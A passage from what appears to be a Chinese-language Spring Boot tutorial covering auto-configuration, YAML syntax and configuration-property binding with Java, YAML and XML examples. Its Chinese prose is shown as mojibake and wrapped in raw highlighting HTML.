‡æ³¨çš„ç±»ï¼‰çš„æ‰€åœ¨åŒ…åŠä¸‹é¢æ‰€æœ‰å­åŒ…é‡Œé¢çš„æ‰€æœ‰ç»„ä»¶æ‰«æåˆ°Springå®¹å™¨ï¼›&#x3D;&#x3D;</p><p>â€‹@<strong>Import</strong>(EnableAutoConfigurationImportSelector.class)ï¼›</p><p>â€‹ç»™å®¹å™¨ä¸­å¯¼å…¥ç»„ä»¶ï¼Ÿ</p><p>â€‹<strong>EnableAutoConfigurationImportSelector</strong>ï¼šå¯¼å…¥å“ªäº›ç»„ä»¶çš„é€‰æ‹©å™¨ï¼›</p><p>â€‹å°†æ‰€æœ‰éœ€è¦å¯¼å…¥çš„ç»„ä»¶ä»¥å…¨ç±»åçš„æ–¹å¼è¿”å›ï¼›è¿™äº›ç»„ä»¶å°±ä¼šè¢«æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼›</p><p>â€‹ä¼šç»™å®¹å™¨ä¸­å¯¼å…¥éå¸¸å¤šçš„è‡ªåŠ¨é…ç½®ç±»ï¼ˆxxxAutoConfigurationï¼‰ï¼›å°±æ˜¯ç»™å®¹å™¨ä¸­å¯¼å…¥è¿™ä¸ªåœºæ™¯éœ€è¦çš„æ‰€æœ‰ç»„ä»¶ï¼Œå¹¶é…ç½®å¥½è¿™äº›ç»„ä»¶ï¼›<img src="/images/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129224104.png" alt="è‡ªåŠ¨é…ç½®ç±»"></p><p>æœ‰äº†è‡ªåŠ¨é…ç½®ç±»ï¼Œå…å»äº†æˆ‘ä»¬æ‰‹åŠ¨ç¼–å†™é…ç½®æ³¨å…¥åŠŸèƒ½ç»„ä»¶ç­‰çš„å·¥ä½œï¼›</p><p>â€‹SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class,classLoader)ï¼›</p><p>&#x3D;&#x3D;Spring Bootåœ¨å¯åŠ¨çš„æ—¶å€™ä»ç±»è·¯å¾„ä¸‹çš„META-INF&#x2F;spring.factoriesä¸­è·å–EnableAutoConfigurationæŒ‡å®šçš„å€¼ï¼Œå°†è¿™äº›å€¼ä½œä¸ºè‡ªåŠ¨é…ç½®ç±»å¯¼å…¥åˆ°å®¹å™¨ä¸­ï¼Œè‡ªåŠ¨é…ç½®ç±»å°±ç”Ÿæ•ˆï¼Œå¸®æˆ‘ä»¬è¿›è¡Œè‡ªåŠ¨é…ç½®å·¥ä½œï¼›&#x3D;&#x3D;ä»¥å‰æˆ‘ä»¬éœ€è¦è‡ªå·±é…ç½®çš„ä¸œè¥¿ï¼Œè‡ªåŠ¨é…ç½®ç±»éƒ½å¸®æˆ‘ä»¬ï¼›</p><p>J2EEçš„æ•´ä½“æ•´åˆè§£å†³æ–¹æ¡ˆå’Œè‡ªåŠ¨é…ç½®éƒ½åœ¨spring-boot-autoconfigure-1.5.9.RELEASE.jarï¼›</p><p>â€‹</p><p>&#x3D;&#x3D;Springæ³¨è§£ç‰ˆï¼ˆè°·ç²’å­¦é™¢ï¼‰&#x3D;&#x3D;</p><h2><span id="6-ä½¿ç”¨spring-initializerå¿«é€Ÿåˆ›å»ºspring-booté¡¹ç›®">6ã€ä½¿ç”¨Spring Initializerå¿«é€Ÿåˆ›å»ºSpring Booté¡¹ç›®</span></h2><h3><span id="1-ideaä½¿ç”¨-spring-initializerå¿«é€Ÿåˆ›å»ºé¡¹ç›®">1ã€IDEAï¼šä½¿ç”¨ Spring Initializerå¿«é€Ÿåˆ›å»ºé¡¹ç›®</span></h3><p>IDEéƒ½æ”¯æŒä½¿ç”¨Springçš„é¡¹ç›®åˆ›å»ºå‘å¯¼å¿«é€Ÿåˆ›å»ºä¸€ä¸ªSpring Booté¡¹ç›®ï¼›</p><p>é€‰æ‹©æˆ‘ä»¬éœ€è¦çš„æ¨¡å—ï¼›å‘å¯¼ä¼šè”ç½‘åˆ›å»ºSpring Booté¡¹ç›®ï¼›</p><p>é»˜è®¤ç”Ÿæˆçš„Spring Booté¡¹ç›®ï¼›</p><ul><li>ä¸»ç¨‹åºå·²ç»ç”Ÿæˆå¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦æˆ‘ä»¬è‡ªå·±çš„é€»è¾‘</li><li>resourcesæ–‡ä»¶å¤¹ä¸­ç›®å½•ç»“æ„<ul><li>staticï¼šä¿å­˜æ‰€æœ‰çš„é™æ€èµ„æºï¼› js css  imagesï¼›</li><li>templatesï¼šä¿å­˜æ‰€æœ‰çš„æ¨¡æ¿é¡µé¢ï¼›ï¼ˆSpring Booté»˜è®¤jaråŒ…ä½¿ç”¨åµŒå…¥å¼çš„Tomcatï¼Œé»˜è®¤ä¸æ”¯æŒJSPé¡µé¢ï¼‰ï¼›å¯ä»¥ä½¿ç”¨æ¨¡æ¿å¼•æ“ï¼ˆfreemarkerã€thymeleafï¼‰ï¼›</li><li>application.propertiesï¼šSpring Bootåº”ç”¨çš„é…ç½®æ–‡ä»¶ï¼›å¯ä»¥ä¿®æ”¹ä¸€äº›é»˜è®¤è®¾ç½®ï¼›</li></ul></li></ul><h3><span id="2-stsä½¿ç”¨-spring-starter-projectå¿«é€Ÿåˆ›å»ºé¡¹ç›®">2ã€STSä½¿ç”¨ Spring Starter Projectå¿«é€Ÿåˆ›å»ºé¡¹ç›®</span></h3><hr><h1><span id="äºŒ-é…ç½®æ–‡ä»¶">äºŒã€é…ç½®æ–‡ä»¶</span></h1><h2><span id="1-é…ç½®æ–‡ä»¶">1ã€é…ç½®æ–‡ä»¶</span></h2><p>SpringBootä½¿ç”¨ä¸€ä¸ªå…¨å±€çš„é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶åæ˜¯å›ºå®šçš„ï¼›</p><p>â€¢application.properties</p><p>â€¢application.yml</p><p>é…ç½®æ–‡ä»¶çš„ä½œç”¨ï¼šä¿®æ”¹SpringBootè‡ªåŠ¨é…ç½®çš„é»˜è®¤å€¼ï¼›SpringBootåœ¨åº•å±‚éƒ½ç»™æˆ‘ä»¬è‡ªåŠ¨é…ç½®å¥½ï¼›</p><p>YAMLï¼ˆYAML Ainâ€™t Markup Languageï¼‰</p><p>â€‹YAML  A Markup Languageï¼šæ˜¯ä¸€ä¸ªæ ‡è®°è¯­è¨€</p><p>â€‹YAML   isnâ€™t Markup Languageï¼šä¸æ˜¯ä¸€ä¸ªæ ‡è®°è¯­è¨€ï¼›</p><p>æ ‡è®°è¯­è¨€ï¼š</p><p>â€‹ä»¥å‰çš„é…ç½®æ–‡ä»¶ï¼›å¤§å¤šéƒ½ä½¿ç”¨çš„æ˜¯  <strong>xxxx.xml</strong>æ–‡ä»¶ï¼›</p><p>â€‹YAMLï¼š<strong>ä»¥æ•°æ®ä¸ºä¸­å¿ƒ</strong>ï¼Œæ¯”jsonã€xmlç­‰æ›´é€‚åˆåšé…ç½®æ–‡ä»¶ï¼›</p><p>â€‹YAMLï¼šé…ç½®ä¾‹å­</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br></pre></td></tr></table></figure><p>â€‹XMLï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span>&gt;</span>8081<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure><h2><span id="2-yamlè¯­æ³•">2ã€YAMLè¯­æ³•ï¼š</span></h2><h3><span id="1-åŸºæœ¬è¯­æ³•">1ã€åŸºæœ¬è¯­æ³•</span></h3><p>k:(ç©ºæ ¼)vï¼šè¡¨ç¤ºä¸€å¯¹é”®å€¼å¯¹ï¼ˆç©ºæ ¼å¿…é¡»æœ‰ï¼‰ï¼›</p><p>ä»¥<strong>ç©ºæ ¼</strong>çš„ç¼©è¿›æ¥æ§åˆ¶å±‚çº§å…³ç³»ï¼›åªè¦æ˜¯å·¦å¯¹é½çš„ä¸€åˆ—æ•°æ®ï¼Œéƒ½æ˜¯åŒä¸€ä¸ªå±‚çº§çš„</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/hello</span></span><br></pre></td></tr></table></figure><p>å±æ€§å’Œå€¼ä¹Ÿæ˜¯å¤§å°å†™æ•æ„Ÿï¼›</p><h3><span id="2-å€¼çš„å†™æ³•">2ã€å€¼çš„å†™æ³•</span></h3><h4><span id="å­—é¢é‡æ™®é€šçš„å€¼æ•°å­—å­—ç¬¦ä¸²å¸ƒå°”">å­—é¢é‡ï¼šæ™®é€šçš„å€¼ï¼ˆæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”ï¼‰</span></h4><p>â€‹k: vï¼šå­—é¢ç›´æ¥æ¥å†™ï¼›</p><p>â€‹å­—ç¬¦ä¸²é»˜è®¤ä¸ç”¨åŠ ä¸Šå•å¼•å·æˆ–è€…åŒå¼•å·ï¼›</p><p>â€‹â€œâ€ï¼šåŒå¼•å·ï¼›ä¸ä¼šè½¬ä¹‰å­—ç¬¦ä¸²é‡Œé¢çš„ç‰¹æ®Šå­—ç¬¦ï¼›ç‰¹æ®Šå­—ç¬¦ä¼šä½œä¸ºæœ¬èº«æƒ³è¡¨ç¤ºçš„æ„æ€</p><p>â€‹name:   â€œzhangsan \n lisiâ€ï¼šè¾“å‡ºï¼›zhangsan æ¢è¡Œ  lisi</p><p>â€‹â€˜â€™ï¼šå•å¼•å·ï¼›ä¼šè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œç‰¹æ®Šå­—ç¬¦æœ€ç»ˆåªæ˜¯ä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²æ•°æ®</p><p>â€‹name:   â€˜zhangsan \n lisiâ€™ï¼šè¾“å‡ºï¼›zhangsan \n  lisi</p><h4><span id="å¯¹è±¡-mapå±æ€§å’Œå€¼é”®å€¼å¯¹">å¯¹è±¡ã€Mapï¼ˆå±æ€§å’Œå€¼ï¼‰ï¼ˆé”®å€¼å¯¹ï¼‰ï¼š</span></h4><p>â€‹k: vï¼šåœ¨ä¸‹ä¸€è¡Œæ¥å†™å¯¹è±¡çš„å±æ€§å’Œå€¼çš„å…³ç³»ï¼›æ³¨æ„ç¼©è¿›</p><p>â€‹å¯¹è±¡è¿˜æ˜¯k: vçš„æ–¹å¼</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span></span><br><span class="line"><span class="attr">lastName:</span> <span class="string">zhangsan</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>è¡Œå†…å†™æ³•ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span> &#123;<span class="attr">lastName:</span> <span class="string">zhangsan</span>,<span class="attr">age:</span> <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><h4><span id="æ•°ç»„list-set">æ•°ç»„ï¼ˆListã€Setï¼‰ï¼š</span></h4><p>ç”¨- å€¼è¡¨ç¤ºæ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">pig</span></span><br></pre></td></tr></table></figure><p>è¡Œå†…å†™æ³•</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span> [<span class="string">cat</span>,<span class="string">dog</span>,<span class="string">pig</span>]</span><br></pre></td></tr></table></figure><h2><span id="3-é…ç½®æ–‡ä»¶å€¼æ³¨å…¥">3ã€é…ç½®æ–‡ä»¶å€¼æ³¨å…¥</span></h2><p>é…ç½®æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">    <span class="attr">lastName:</span> <span class="string">hello</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">18</span></span><br><span class="line">    <span class="attr">boss:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">birth:</span> <span class="number">2017</span><span class="string">/12/12</span></span><br><span class="line">    <span class="attr">maps:</span> &#123;<span class="attr">k1:</span> <span class="string">v1</span>,<span class="attr">k2:</span> <span class="number">12</span>&#125;</span><br><span class="line">    <span class="attr">lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">lisi</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zhaoliu</span></span><br><span class="line">    <span class="attr">dog:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">å°ç‹—</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><p>javaBeanï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„æ¯ä¸€ä¸ªå±æ€§çš„å€¼ï¼Œæ˜ å°„åˆ°è¿™ä¸ªç»„ä»¶ä¸­</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>ï¼šå‘Šè¯‰SpringBootå°†æœ¬ç±»ä¸­çš„æ‰€æœ‰å±æ€§å’Œé…ç½®æ–‡ä»¶ä¸­ç›¸å…³çš„é…ç½®è¿›è¡Œç»‘å®šï¼›</span></span><br><span class="line"><span class="comment"> *      prefix = &quot;person&quot;ï¼šé…ç½®æ–‡ä»¶ä¸­å“ªä¸ªä¸‹é¢çš„æ‰€æœ‰å±æ€§è¿›è¡Œä¸€ä¸€æ˜ å°„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åªæœ‰è¿™ä¸ªç»„ä»¶æ˜¯å®¹å™¨ä¸­çš„ç»„ä»¶ï¼Œæ‰èƒ½å®¹å™¨æä¾›çš„<span class="doctag">@ConfigurationProperties</span>åŠŸèƒ½ï¼›</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¯¼å…¥é…ç½®æ–‡ä»¶å¤„ç†å™¨ï¼Œä»¥åç¼–å†™é…ç½®å°±æœ‰æç¤ºäº†</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--å¯¼å…¥é…ç½®æ–‡ä»¶å¤„ç†å™¨ï¼Œé…ç½®æ–‡ä»¶è¿›è¡Œç»‘å®šå°±ä¼šæœ‰æç¤º--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="1-propertiesé…ç½®æ–‡ä»¶åœ¨ideaä¸­é»˜è®¤utf-8å¯èƒ½ä¼šä¹±ç ">1ã€propertiesé…ç½®æ–‡ä»¶åœ¨ideaä¸­é»˜è®¤utf-8å¯èƒ½ä¼šä¹±ç </span></h4><p>è°ƒæ•´</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180130161620.png" alt="ideaé…ç½®ä¹±ç "></p><h4><span id="2-valueè·å–å€¼å’Œconfigurationpropertiesè·å–å€¼æ¯”è¾ƒ">2ã€@Valueè·å–å€¼å’Œ@ConfigurationPropertiesè·å–å€¼æ¯”è¾ƒ</span></h4><table><thead><tr><th></th><th>@ConfigurationProperties</th><th>@Value</th></tr></thead><tbody><tr><td>åŠŸèƒ½</td><td>æ‰¹é‡æ³¨å…¥é…ç½®æ–‡ä»¶ä¸­çš„å±æ€§</td><td>ä¸€ä¸ªä¸ªæŒ‡å®š</td></tr><tr><td>æ¾æ•£ç»‘å®šï¼ˆæ¾æ•£è¯­æ³•ï¼‰</td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr><tr><td>SpEL</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>JSR303æ•°æ®æ ¡éªŒ</td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr><tr><td>å¤æ‚ç±»å‹å°è£…</td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr></tbody></table><p>é…ç½®æ–‡ä»¶ymlè¿˜æ˜¯propertiesä»–ä»¬éƒ½èƒ½è·å–åˆ°å€¼ï¼›</p><p>å¦‚æœè¯´ï¼Œæˆ‘ä»¬åªæ˜¯åœ¨æŸä¸ªä¸šåŠ¡é€»è¾‘ä¸­éœ€è¦è·å–ä¸€ä¸‹é…ç½®æ–‡ä»¶ä¸­çš„æŸé¡¹å€¼ï¼Œä½¿ç”¨@Valueï¼›</p><p>å¦‚æœè¯´ï¼Œæˆ‘ä»¬ä¸“é—¨ç¼–å†™äº†ä¸€ä¸ªjavaBeanæ¥å’Œé…ç½®æ–‡ä»¶è¿›è¡Œæ˜ å°„ï¼Œæˆ‘ä»¬å°±ç›´æ¥ä½¿ç”¨@ConfigurationPropertiesï¼›</p><h4><span id="3-é…ç½®æ–‡ä»¶æ³¨å…¥å€¼æ•°æ®æ ¡éªŒ">3ã€é…ç½®æ–‡ä»¶æ³¨å…¥å€¼æ•°æ®æ ¡éªŒ</span></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span></span><br><span class="line"><span class="meta">@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class=&quot;Person&quot;&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name=&quot;lastName&quot; value=&quot;å­—é¢é‡/$&#123;key&#125;ä»ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶ä¸­è·å–å€¼/#&#123;SpEL&#125;&quot;&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastNameå¿…é¡»æ˜¯é‚®ç®±æ ¼å¼</span></span><br><span class="line">    <span class="meta">@Email</span></span><br><span class="line">    <span class="comment">//@Value(&quot;$&#123;person.last-name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value(&quot;#&#123;11*2&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value(&quot;true&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure><h4><span id="4-propertysourceampimportresourceampbean">4ã€@PropertySource&amp;@ImportResource&amp;@Bean</span></h4><p>@<strong>PropertySource</strong>ï¼šåŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„æ¯ä¸€ä¸ªå±æ€§çš„å€¼ï¼Œæ˜ å°„åˆ°è¿™ä¸ªç»„ä»¶ä¸­</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>ï¼šå‘Šè¯‰SpringBootå°†æœ¬ç±»ä¸­çš„æ‰€æœ‰å±æ€§å’Œé…ç½®æ–‡ä»¶ä¸­ç›¸å…³çš„é…ç½®è¿›è¡Œç»‘å®šï¼›</span></span><br><span class="line"><span class="comment"> *      prefix = &quot;person&quot;ï¼šé…ç½®æ–‡ä»¶ä¸­å“ªä¸ªä¸‹é¢çš„æ‰€æœ‰å±æ€§è¿›è¡Œä¸€ä¸€æ˜ å°„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åªæœ‰è¿™ä¸ªç»„ä»¶æ˜¯å®¹å™¨ä¸­çš„ç»„ä»¶ï¼Œæ‰èƒ½å®¹å™¨æä¾›çš„<span class="doctag">@ConfigurationProperties</span>åŠŸèƒ½ï¼›</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@ConfigurationProperties</span>(prefix = &quot;person&quot;)é»˜è®¤ä»å…¨å±€é…ç½®æ–‡ä»¶ä¸­è·å–å€¼ï¼›</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PropertySource(value = &#123;&quot;classpath:person.properties&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span></span><br><span class="line"><span class="comment">//@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class=&quot;Person&quot;&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name=&quot;lastName&quot; value=&quot;å­—é¢é‡/$&#123;key&#125;ä»ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶ä¸­è·å–å€¼/#&#123;SpEL&#125;&quot;&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastNameå¿…é¡»æ˜¯é‚®ç®±æ ¼å¼</span></span><br><span class="line">   <span class="comment">// @Email</span></span><br><span class="line">    <span class="comment">//@Value(&quot;$&#123;person.last-name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value(&quot;#&#123;11*2&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value(&quot;true&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>@<strong>ImportResource</strong>ï¼šå¯¼å…¥Springçš„é…ç½®æ–‡ä»¶ï¼Œè®©é…ç½®æ–‡ä»¶é‡Œé¢çš„å†…å®¹ç”Ÿæ•ˆï¼›</p><p>Spring Booté‡Œé¢æ²¡æœ‰Springçš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è‡ªå·±ç¼–å†™çš„é…ç½®æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è‡ªåŠ¨è¯†åˆ«ï¼›</p><p>æƒ³è®©Springçš„é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼ŒåŠ è½½è¿›æ¥ï¼›@<strong>ImportResource</strong>æ ‡æ³¨åœ¨ä¸€ä¸ªé…ç½®ç±»ä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ImportResource(locations = &#123;&quot;classpath:beans.xml&quot;&#125;)</span></span><br><span class="line">å¯¼å…¥Springçš„é…ç½®æ–‡ä»¶è®©å…¶ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure><p>ä¸æ¥ç¼–å†™Springçš„é…ç½®æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.springboot.service.HelloService&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBootæ¨èç»™å®¹å™¨ä¸­æ·»åŠ 